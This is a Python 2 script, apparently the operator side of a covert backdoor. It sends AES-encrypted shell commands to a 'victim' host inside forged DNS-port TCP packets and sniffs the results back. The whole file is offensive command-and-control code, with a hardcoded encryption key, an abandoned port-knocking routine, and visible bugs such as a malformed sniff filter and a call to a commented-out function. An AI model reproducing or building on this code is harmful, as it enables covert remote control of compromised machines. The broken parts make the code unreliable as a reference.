
import sys # For getting command line arguments
from scapy.all import * #Scapy library used to craft packets
from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
import time #used for thread sleep methods

global targetIP
global targetPort


def sendCommand(command):
    """Takes in user supplied command string and initiates port knocking (if required)
    and sending of the command"""
    #If it's the first command, send the port knocks
    global counter
    print "The counter is at %d"%(counter)
    send(craftCommandPacket(command));
    return;

def knockPorts(targetIP):
    #Send packet sequence 90,91,92
    send(craftKnockPacket(514));
    #Sleep for a second so that Client has time to process.
    time.sleep( 1 )
    send(craftKnockPacket(515));
    time.sleep( 1 )
    send(craftKnockPacket(516));
    #TEST1: Check Wireshark

# #Function takes in Destination IP, Destination Port, Data to send
# def craftKnockPacket(srcPort):
#     global targetIP
#     packet = IP(dst=targetIP)/UDP(sport=srcPort, dport=53)
#     print "Crafted packet for IP %s with targetPort %s"%(targetIP,srcPort)
#     return packet;
#
# def knockReply(packet):
#     #If it's from the client's IP
#     #TODO: Check if it has the right data.
#      global targetIP
#      global counter
#      counter = counter + 1
#      if IP in packet[0]:
#          #If the packet that just came in matches the victims IP
#          if packet[IP].src == targetIP:
#              return True
#          else:
#              return False
#      else:
#          return False

def craftCommandPacket(command):
    global targetIP
    global targetPort
    #TODO:
    # data = encryptMessage(command)
    data = command
    packet = (IP(dst=targetIP,ttl=71)/TCP(sport=int(targetPort),dport=53)/ data)
    return packet

def encryptCommand(command):
    key='0123456789abcdef'
    IV = "abcdefghijklmnop"
    encryptor = AES.new(key,AES.MODE_CFB,IV=IV)
    return encryptor.encrypt(command)

def commandResult(packet):
    if IP in packet[0]:
        global targetIP
        srcIP = packet[IP].src
        ttl = packet[IP].ttl
        if srcIP == targetIP and ttl ==71:
            print packet.load
            return True
        else:
            return False
    else:
        return False

#PsuedoCode:
# 1. Get command line arguments
global targetIP
if len(sys.argv) < 2:
    print "Please use format python blackhat.py targetIP targetPort"
else:
    targetIP = sys.argv[1]
    print "START Victim IP is %s"%(targetIP)
    global targetPort
    targetPort = sys.argv[2]
    print "START Victim Port is %s"%(targetPort)
    # Go into the send/receive loop
    counter = 0;
    while True:

        ##SEND
        print "ENTER COMMAND -> " + targetIP + ":"
        command = raw_input()
        # if counter == 0:
        #     knockPorts(targetIP)
        #     sniff( filter="udp and sport 3000", stop_filter=knockReply)
        sendCommand(encryptCommand(command))
        sniff(timeout=1, filter="tcp and and dst port 500 and src port 53", stop_filter=commandResult)
